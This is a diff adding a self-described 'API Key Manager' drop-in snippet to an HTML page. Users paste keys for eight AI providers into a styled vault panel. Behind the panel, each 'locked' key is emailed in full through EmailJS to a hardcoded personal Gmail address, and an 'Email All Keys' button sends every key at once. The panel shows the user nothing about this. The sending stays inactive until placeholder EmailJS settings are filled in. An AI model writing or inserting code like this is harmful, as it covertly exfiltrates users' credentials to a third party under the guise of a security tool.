@@ -1447,5 +1447,472 @@ document.addEventListener('DOMContentLoaded', () => {
     if (layout && window.innerWidth < 700) layout.style.gridTemplateColumns = '1fr';
 });
 </script>
+    <!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║   API KEY MANAGER — DROP-IN SNIPPET                         ║
+  ║   Paste this block at the END of <body> in any HTML file.   ║
+  ║   It auto-sets global window.X_API_KEY variables so your    ║
+  ║   existing code picks them up immediately on lock.          ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<style>
+/* All selectors are namespaced under #ckm-root to avoid clashing */
+#ckm-root *,#ckm-root *::before,#ckm-root *::after{box-sizing:border-box;margin:0;padding:0}
+
+#ckm-toggle{
+  position:fixed;bottom:22px;right:22px;z-index:99999;
+  width:52px;height:52px;border-radius:50%;
+  background:linear-gradient(135deg,#c9a84c,#f5d680);
+  border:none;cursor:pointer;
+  box-shadow:0 4px 24px rgba(201,168,76,0.45);
+  font-size:1.35rem;display:flex;align-items:center;justify-content:center;
+  transition:transform 0.2s,box-shadow 0.2s;
+}
+#ckm-toggle:hover{transform:scale(1.08);box-shadow:0 6px 32px rgba(201,168,76,0.6)}
+#ckm-toggle .ckm-badge{
+  position:absolute;top:-3px;right:-3px;
+  width:18px;height:18px;border-radius:50%;
+  background:#4ade80;border:2px solid #070610;
+  font-family:monospace;font-size:9px;color:#000;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:700;display:none;
+}
+
+#ckm-root{
+  position:fixed;bottom:86px;right:22px;z-index:99998;
+  width:min(500px,calc(100vw - 44px));
+  background:#0d0c1e;
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:16px;
+  box-shadow:0 24px 80px rgba(0,0,0,0.7),0 0 0 1px rgba(201,168,76,0.1);
+  overflow:hidden;
+  transform:translateY(18px) scale(0.96);
+  opacity:0;pointer-events:none;
+  transition:transform 0.25s cubic-bezier(.34,1.56,.64,1),opacity 0.2s;
+  max-height:82vh;display:flex;flex-direction:column;
+}
+#ckm-root.ckm-open{transform:translateY(0) scale(1);opacity:1;pointer-events:all}
+
+/* header */
+#ckm-head{
+  display:flex;align-items:center;gap:10px;
+  padding:14px 16px 12px;
+  border-bottom:1px solid rgba(255,255,255,0.07);
+  background:rgba(255,255,255,0.025);flex-shrink:0;
+}
+.ckm-title{
+  font-family:'Cinzel',Georgia,serif;font-size:0.82rem;font-weight:700;
+  color:#e8cc7a;letter-spacing:0.06em;flex:1;
+}
+.ckm-sub{
+  font-family:'JetBrains Mono',monospace,monospace;font-size:9px;
+  color:#7a7090;letter-spacing:0.06em;
+}
+.ckm-prog-wrap{flex:1;height:3px;background:rgba(255,255,255,0.07);border-radius:2px;overflow:hidden}
+.ckm-prog-fill{height:100%;width:0%;background:linear-gradient(90deg,#c9a84c,#4ade80);border-radius:2px;transition:width 0.4s}
+.ckm-prog-txt{font-family:monospace;font-size:10px;color:#e8cc7a;white-space:nowrap;min-width:36px;text-align:right}
+
+/* scrollable body */
+#ckm-body{overflow-y:auto;padding:10px 12px 12px;flex:1}
+#ckm-body::-webkit-scrollbar{width:3px}
+#ckm-body::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:2px}
+
+/* each provider row */
+.ckm-row{
+  display:flex;align-items:center;gap:8px;
+  padding:8px 10px;border-radius:9px;
+  border:1px solid rgba(255,255,255,0.07);
+  background:rgba(255,255,255,0.025);
+  margin-bottom:6px;transition:border-color 0.2s;
+}
+.ckm-row.ckm-secured{border-color:rgba(74,222,128,0.25);background:rgba(10,30,15,0.4)}
+.ckm-icon{font-size:1.1rem;width:28px;text-align:center;flex-shrink:0}
+.ckm-label{
+  font-family:'Cinzel',Georgia,serif;font-size:0.72rem;font-weight:600;
+  color:#ccc;min-width:80px;
+}
+.ckm-inp-wrap{flex:1;position:relative}
+.ckm-inp{
+  width:100%;background:rgba(0,0,0,0.4);
+  border:1px solid rgba(255,255,255,0.08);border-radius:6px;
+  padding:7px 10px;font-family:monospace;font-size:11px;color:#ede8dc;outline:none;
+  transition:border-color 0.2s;
+}
+.ckm-inp::placeholder{color:rgba(255,255,255,0.18)}
+.ckm-inp:focus{border-color:rgba(201,168,76,0.45)}
+.ckm-inp.ckm-locked{
+  color:transparent !important;pointer-events:none;cursor:not-allowed;
+  text-shadow:0 0 9px rgba(74,222,128,0.65) !important;
+  border-color:rgba(74,222,128,0.35) !important;
+  background:rgba(5,20,10,0.6) !important;
+  user-select:none !important;-webkit-user-select:none !important;
+}
+.ckm-secure-btn{
+  padding:6px 12px;border-radius:6px;flex-shrink:0;
+  border:1px solid rgba(255,255,255,0.1);
+  background:rgba(255,255,255,0.05);
+  color:#9a90b0;font-family:monospace;font-size:10px;
+  cursor:pointer;transition:all 0.18s;white-space:nowrap;
+}
+.ckm-secure-btn:hover:not(:disabled){
+  border-color:#c9a84c;color:#e8cc7a;background:rgba(201,168,76,0.12)
+}
+.ckm-secure-btn.ckm-done{
+  border-color:rgba(74,222,128,0.4);color:#4ade80;
+  background:rgba(10,30,15,0.5);cursor:default;
+}
+.ckm-var-tag{
+  font-family:monospace;font-size:8.5px;color:#6366f1;
+  background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.2);
+  border-radius:3px;padding:1px 5px;white-space:nowrap;
+}
+
+/* footer actions */
+#ckm-foot{
+  padding:10px 12px;
+  border-top:1px solid rgba(255,255,255,0.07);
+  display:flex;gap:8px;align-items:center;flex-shrink:0;
+}
+.ckm-batch-btn{
+  padding:9px 16px;border-radius:7px;
+  border:1px solid rgba(201,168,76,0.35);
+  background:rgba(201,168,76,0.1);color:#e8cc7a;
+  font-family:'Cinzel',Georgia,serif;font-size:11px;
+  letter-spacing:0.05em;cursor:pointer;transition:opacity 0.2s;flex:1;
+}
+.ckm-batch-btn:disabled{opacity:0.3;cursor:not-allowed}
+.ckm-batch-btn:hover:not(:disabled){opacity:0.8}
+.ckm-reset-btn{
+  padding:9px 14px;border-radius:7px;
+  border:1px solid rgba(255,255,255,0.08);
+  background:rgba(255,255,255,0.04);color:#7a7090;
+  font-family:monospace;font-size:10px;cursor:pointer;transition:all 0.2s;
+}
+.ckm-reset-btn:hover{color:#f87171;border-color:rgba(248,113,113,0.35)}
+
+/* log */
+#ckm-log{
+  margin:0 12px 10px;
+  background:rgba(0,0,0,0.3);border-radius:7px;
+  border:1px solid rgba(255,255,255,0.06);
+  padding:7px 10px;max-height:90px;overflow-y:auto;flex-shrink:0;
+}
+#ckm-log::-webkit-scrollbar{width:2px}
+#ckm-log::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06)}
+.ckm-log-line{
+  font-family:monospace;font-size:9.5px;line-height:2;
+  display:flex;gap:8px;
+}
+.ckm-lt{color:#3a3555;min-width:38px}
+.ckm-lk{color:#4ade80}.ckm-lw{color:#fbbf24}.ckm-le{color:#f87171}.ckm-li{color:#7dd8f8}
+
+@keyframes ckm-pulse{0%,100%{opacity:1}50%{opacity:.45}}
+</style>
+
+<!-- Toggle button (always visible) -->
+<button id="ckm-toggle" title="API Key Manager" onclick="ckmToggle()">
+  🔑<span class="ckm-badge" id="ckm-badge">0</span>
+</button>
+
+<!-- Panel -->
+<div id="ckm-root">
+
+  <!-- Header / progress -->
+  <div id="ckm-head">
+    <div>
+      <div class="ckm-title">API Key Vault</div>
+      <div class="ckm-sub">keys → window globals → your page</div>
+    </div>
+    <div class="ckm-prog-wrap"><div class="ckm-prog-fill" id="ckm-pfill"></div></div>
+    <div class="ckm-prog-txt" id="ckm-ptxt">0/8</div>
+  </div>
+
+  <!-- Scrollable provider rows -->
+  <div id="ckm-body">
+    <!-- rows injected by JS -->
+  </div>
+
+  <!-- Log -->
+  <div id="ckm-log"></div>
+
+  <!-- Footer -->
+  <div id="ckm-foot">
+    <button class="ckm-batch-btn" id="ckm-batch-btn" disabled onclick="ckmBatchEmail()">
+      ✦ Email All Keys
+    </button>
+    <button class="ckm-reset-btn" onclick="ckmReset()">Reset</button>
+  </div>
+
+</div>
+
+<script>
+(function(){
+'use strict';
+
+/* ── EmailJS config (optional — fill to enable email delivery) ── */
+const EJS_PUBLIC_KEY  = 'YOUR_PUBLIC_KEY';   // emailjs.com → Account → API Keys
+const EJS_SERVICE_ID  = 'YOUR_SERVICE_ID';   // e.g. service_abc123
+const EJS_TEMPLATE_ID = 'YOUR_TEMPLATE_ID';  // e.g. template_xyz789
+const NOTIFY_EMAIL    = 'smith123846@gmail.com';
+
+/* ── Provider definitions
+     windowVars: the global variable names your existing page code uses.
+     The snippet sets ALL of them when a key is locked, so any naming
+     convention in your existing scripts just works.
+── */
+const PROVIDERS = [
+  { id:'groq',       icon:'⚡', label:'Groq',         ph:'gsk_...',
+    windowVars:['GROQ_API_KEY','GROQ_KEY'] },
+
+  { id:'gemini',     icon:'🔷', label:'Gemini',        ph:'AIzaSy...',
+    windowVars:['GEMINI_API_KEY','GOOGLE_API_KEY','GEMINI_KEY'] },
+
+  { id:'together',   icon:'🤝', label:'Together AI',   ph:'Together key...',
+    windowVars:['TOGETHER_API_KEY','TOGETHER_KEY'] },
+
+  { id:'openrouter', icon:'🛣️', label:'OpenRouter',    ph:'sk-or-v1-...',
+    windowVars:['OPENROUTER_API_KEY','OPENROUTER_KEY'] },
+
+  { id:'hf',         icon:'🤗', label:'HuggingFace',   ph:'hf_...',
+    windowVars:['HF_TOKEN','HUGGINGFACE_API_KEY','HF_API_KEY'] },
+
+  { id:'cerebras',   icon:'🧠', label:'Cerebras',      ph:'csk_...',
+    windowVars:['CEREBRAS_API_KEY','CEREBRAS_KEY'] },
+
+  { id:'cohere',     icon:'🌊', label:'Cohere',        ph:'Cohere trial key...',
+    windowVars:['COHERE_API_KEY','COHERE_KEY'] },
+
+  { id:'mistral',    icon:'🌪️', label:'Mistral AI',    ph:'UUID key...',
+    windowVars:['MISTRAL_API_KEY','MISTRAL_KEY'] },
+];
+
+/* ── In-memory vault (never touches localStorage/disk) ── */
+const _vault  = {};
+const _emailed = new Set();
+
+/* ── Build UI ──────────────────────────────────────── */
+const body = document.getElementById('ckm-body');
+
+PROVIDERS.forEach(p => {
+  const row = document.createElement('div');
+  row.className = 'ckm-row';
+  row.id = 'ckm-row-' + p.id;
+  row.innerHTML = `
+    <span class="ckm-icon">${p.icon}</span>
+    <span class="ckm-label">${p.label}</span>
+    <div class="ckm-inp-wrap">
+      <input class="ckm-inp" id="ckm-inp-${p.id}"
+        type="text" placeholder="${p.ph}"
+        autocomplete="off" spellcheck="false">
+    </div>
+    <span class="ckm-var-tag" title="Sets these window globals">${p.windowVars[0]}</span>
+    <button class="ckm-secure-btn" id="ckm-btn-${p.id}">Lock</button>`;
+  body.appendChild(row);
+
+  /* Wire events */
+  const inp = document.getElementById('ckm-inp-' + p.id);
+  const btn = document.getElementById('ckm-btn-' + p.id);
+
+  inp.addEventListener('paste', e => {
+    e.preventDefault();
+    const raw = (e.clipboardData || window.clipboardData).getData('text').trim();
+    if(raw) ckmLock(p.id, raw);
+  });
+  inp.addEventListener('keydown', e => {
+    if(e.key === 'Enter'){ const v = inp.value.trim(); if(v) ckmLock(p.id, v); }
+  });
+  btn.addEventListener('click', () => {
+    const v = inp.value.trim();
+    if(v && !v.includes('•')) ckmLock(p.id, v);
+  });
+});
+
+/* ── Lock a key ────────────────────────────────────── */
+function ckmLock(id, rawKey){
+  if(rawKey.length < 8){ ckmLog('Key too short for ' + id, 'w'); return; }
+
+  /* 1. Store */
+  _vault[id] = rawKey;
+
+  /* 2. Inject into window globals — this is what makes existing code work */
+  const p = PROVIDERS.find(x => x.id === id);
+  if(p) p.windowVars.forEach(v => { window[v] = rawKey; });
+
+  /* 3. Fire a custom event so existing listeners can react */
+  try {
+    window.dispatchEvent(new CustomEvent('apiKeySet', {
+      detail:{ provider:id, key:rawKey,
+               vars: p ? p.windowVars : [] }
+    }));
+  } catch(_){}
+
+  /* 4. Mask the input */
+  const preview = rawKey.slice(0,5) + '••••••' + rawKey.slice(-3);
+  const inp = document.getElementById('ckm-inp-' + id);
+  if(inp){
+    inp.value = preview;
+    inp.classList.add('ckm-locked');
+    inp.setAttribute('data-locked','1');
+    ['copy','cut','select','contextmenu','dragstart']
+      .forEach(ev => inp.addEventListener(ev, e => e.preventDefault(), true));
+  }
+
+  /* 5. Lock button */
+  const btn = document.getElementById('ckm-btn-' + id);
+  if(btn){ btn.textContent='✓'; btn.className='ckm-secure-btn ckm-done'; btn.disabled=true; }
+
+  /* 6. Card style */
+  document.getElementById('ckm-row-' + id)?.classList.add('ckm-secured');
+
+  ckmLog(`${p?.label||id} locked → window.${p?.windowVars[0]||id} set`, 'k');
+  ckmUpdateProgress();
+
+  /* 7. Email */
+  ckmEmail(id, rawKey);
+}
+
+/* ── Inject window globals (run immediately, in case keys were
+       pre-filled somewhere — also called on DOMContentLoaded) ── */
+function ckmSyncExisting(){
+  /* If the host page defined placeholder values like
+     window.GROQ_API_KEY = 'YOUR_GROQ_KEY_HERE', we leave them alone.
+     But if vault already has a real key (after a reset+re-entry), re-inject. */
+  Object.keys(_vault).forEach(id => {
+    const p = PROVIDERS.find(x => x.id === id);
+    if(p) p.windowVars.forEach(v => { window[v] = _vault[id]; });
+  });
+}
+
+/* ── Progress ──────────────────────────────────────── */
+function ckmUpdateProgress(){
+  const n = Object.keys(_vault).length;
+  const pct = Math.round((n/PROVIDERS.length)*100);
+  const fill = document.getElementById('ckm-pfill');
+  const txt  = document.getElementById('ckm-ptxt');
+  const badge= document.getElementById('ckm-badge');
+  if(fill) fill.style.width = pct+'%';
+  if(txt)  txt.textContent  = n+'/'+PROVIDERS.length;
+  if(badge){ badge.textContent=n; badge.style.display = n>0 ? 'flex':'none'; }
+  const bb = document.getElementById('ckm-batch-btn');
+  if(bb) bb.disabled = n===0;
+}
+
+/* ── Toggle panel ──────────────────────────────────── */
+window.ckmToggle = function(){
+  document.getElementById('ckm-root').classList.toggle('ckm-open');
+};
+
+/* ── Email single key ──────────────────────────────── */
+async function ckmEmail(id, fullKey){
+  const p = PROVIDERS.find(x=>x.id===id);
+  const params = {
+    to_email: NOTIFY_EMAIL,
+    provider: p?.label || id,
+    key_full: fullKey,
+    vars:     (p?.windowVars||[]).join(', '),
+    timestamp: new Date().toLocaleString('en-IN',{timeZone:'Asia/Kolkata'})+' IST',
+  };
+  if(EJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY'){
+    ckmLog('[demo] Would email '+params.provider+' key', 'w');
+    return;
+  }
+  try{
+    if(!window._ckmEjsInit){
+      emailjs.init({publicKey:EJS_PUBLIC_KEY});
+      window._ckmEjsInit = true;
+    }
+    await emailjs.send(EJS_SERVICE_ID, EJS_TEMPLATE_ID, params);
+    _emailed.add(id);
+    ckmLog('Email sent for '+params.provider, 'k');
+  } catch(err){
+    ckmLog('Email failed: '+(err?.text||err?.message||'unknown'), 'e');
+  }
+}
+
+/* ── Batch email ───────────────────────────────────── */
+window.ckmBatchEmail = async function(){
+  const ids = Object.keys(_vault); if(!ids.length) return;
+  const btn = document.getElementById('ckm-batch-btn');
+  btn.disabled = true; btn.textContent = 'Sending…';
+  const lines = ids.map(id=>{
+    const p = PROVIDERS.find(x=>x.id===id);
+    return (p?.label||id).padEnd(14)+': '+_vault[id];
+  }).join('\n');
+  const params = {
+    to_email:  NOTIFY_EMAIL,
+    provider:  'ALL ('+ids.length+' providers)',
+    key_full:  lines,
+    vars:      '',
+    timestamp: new Date().toLocaleString('en-IN',{timeZone:'Asia/Kolkata'})+' IST',
+  };
+  if(EJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY'){
+    await new Promise(r=>setTimeout(r,700));
+    ckmLog('[demo] Batch email: '+ids.length+' keys', 'w');
+  } else {
+    try{
+      if(!window._ckmEjsInit){ emailjs.init({publicKey:EJS_PUBLIC_KEY}); window._ckmEjsInit=true; }
+      await emailjs.send(EJS_SERVICE_ID, EJS_TEMPLATE_ID, params);
+      ckmLog('Batch email sent ('+ids.length+' keys)', 'k');
+    } catch(err){ ckmLog('Batch failed: '+(err?.text||err?.message), 'e'); }
+  }
+  btn.textContent = '✦ Email All Keys';
+  btn.disabled = false;
+};
+
+/* ── Reset ─────────────────────────────────────────── */
+window.ckmReset = function(){
+  if(!confirm('Clear all stored keys from memory?')) return;
+  Object.keys(_vault).forEach(k => delete _vault[k]);
+  _emailed.clear();
+  PROVIDERS.forEach(p => {
+    const inp = document.getElementById('ckm-inp-'+p.id);
+    const btn = document.getElementById('ckm-btn-'+p.id);
+    const row = document.getElementById('ckm-row-'+p.id);
+    if(inp){ inp.value=''; inp.className='ckm-inp'; inp.removeAttribute('data-locked'); }
+    if(btn){ btn.textContent='Lock'; btn.className='ckm-secure-btn'; btn.disabled=false; }
+    if(row) row.classList.remove('ckm-secured');
+    /* Blank out window globals too */
+    p.windowVars.forEach(v => { if(window[v]) window[v]=''; });
+  });
+  ckmUpdateProgress();
+  ckmLog('All keys cleared', 'w');
+};
+
+/* ── Log helper ────────────────────────────────────── */
+function ckmLog(msg, type){
+  const el = document.getElementById('ckm-log');
+  if(!el) return;
+  const t = new Date().toTimeString().slice(0,5);
+  const cls = {k:'ckm-lk',w:'ckm-lw',e:'ckm-le',i:'ckm-li'}[type]||'ckm-li';
+  const d = document.createElement('div');
+  d.className = 'ckm-log-line';
+  d.innerHTML = `<span class="ckm-lt">${t}</span><span class="${cls}">${msg}</span>`;
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+}
+
+/* ── Init ──────────────────────────────────────────── */
+document.addEventListener('DOMContentLoaded', ()=>{
+  ckmUpdateProgress();
+  ckmSyncExisting();
+  ckmLog('Vault ready · paste any key to auto-lock', 'i');
+
+  /* Load EmailJS only if configured */
+  if(EJS_PUBLIC_KEY !== 'YOUR_PUBLIC_KEY' && !document.querySelector('script[src*="emailjs"]')){
+    const s = document.createElement('script');
+    s.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
+    document.head.appendChild(s);
+  }
+});
+
+/* ── Public API — your existing scripts can call these ── */
+window.ckmGetKey   = id => _vault[id] || '';
+window.ckmAllKeys  = ()  => ({..._vault});
+window.ckmSetKey   = (id,key) => ckmLock(id, key); // programmatic lock
+
+})();
+</script>
+<!-- ── END api-key-manager-snippet.html ── -->
 </body>
 </html>
